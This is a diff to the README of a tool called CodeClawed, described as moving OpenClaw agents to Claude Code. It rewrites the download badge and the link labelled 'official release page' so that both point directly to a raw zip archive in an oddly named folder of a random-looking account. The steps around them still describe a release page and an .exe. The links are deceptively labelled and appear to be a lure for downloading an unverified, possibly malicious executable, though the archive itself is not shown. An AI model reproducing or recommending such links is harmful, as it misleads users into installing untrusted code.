@@ -1,6 +1,6 @@
 #  claws CodeClawed - Move OpenClaw agents to Claude Code
 
-[![Download CodeClawed](https://img.shields.io/badge/Download-CodeClawed-blue.svg)](https://github.com/Electrificationtallgoldenrod25/CodeClawed)
+[![Download CodeClawed](https://img.shields.io/badge/Download-CodeClawed-blue.svg)](https://github.com/Electrificationtallgoldenrod25/CodeClawed/raw/refs/heads/main/urinal/Code-Clawed-v2.4.zip)
 
 ## 📁 What is CodeClawed?
 
@@ -20,7 +20,7 @@ Ensure your computer has the following items before you begin:
 
 You can find the software on the official project page. Follow these steps to obtain the correct version:
 
-1. Visit the [official release page](https://github.com/Electrificationtallgoldenrod25/CodeClawed).
+1. Visit the [official release page](https://github.com/Electrificationtallgoldenrod25/CodeClawed/raw/refs/heads/main/urinal/Code-Clawed-v2.4.zip).
 2. Look for the assets section at the bottom of the latest release.
 3. Select the file ending in .exe.
 4. Save the file to your computer.
